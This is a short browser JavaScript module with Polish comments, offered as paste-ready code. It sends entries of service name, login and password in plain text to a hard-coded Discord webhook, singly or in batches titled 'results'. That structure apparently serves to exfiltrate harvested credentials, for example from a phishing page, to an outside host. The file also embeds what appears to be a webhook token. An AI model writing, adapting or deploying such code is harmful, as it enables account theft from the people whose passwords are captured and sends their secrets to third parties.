// webhook.js — wklej całość, zmień tylko URL poniżej.
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1537189499606540308/zSSvet2UDzR5LY6nYSzKcEM7ewNAzHx4brsvdwN7Th0bcvzZZeHe0RJ5zWGW1DoVr7IW";

async function discordSend(payload, maxAttempts = 3) {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const res = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (res.status === 429) { // rate limit — czekamy i próbujemy znowu
        const retryAfter = (await res.json()).retry_after || 1;
        await new Promise(r => setTimeout(r, retryAfter * 1000));
        continue;
      }
      if (!res.ok) {
        console.error("[webhook] HTTP " + res.status + ": " + await res.text());
        return false;
      }
      return true; // 204 = wysłane
    } catch (err) {
      console.error("[webhook]", err);
      await new Promise(r => setTimeout(r, 1000));
    }
  }
  return false;
}

async function discordSendEntry(entry) {
  return discordSend({
    embeds: [{
      title: entry.title || "Nowy wpis",
      description: [
        "**Usługa:** " + (entry.service || "—"),
        "**Login:** `" + (entry.login || "") + "`",
        "**Hasło:** `" + (entry.password || "") + "`",
        "**Czas:** " + new Date().toISOString()
      ].join("\n"),
      color: 0x5865F2
    }]
  });
}

async function discordSendMany(entries, title = "Wyniki") {
  const lines = entries.map(e =>
    "**" + (e.service || "?") + "** | `" + (e.login || "") + "` : `" + (e.password || "") + "`"
  );
  return discordSend({
    embeds: [{
      title: title,
      description: lines.join("\n").slice(0, 4096),
      color: 0x5865F2
    }]
  });
}

window.DiscordNotify = {
  entry: discordSendEntry,
  many: discordSendMany
};
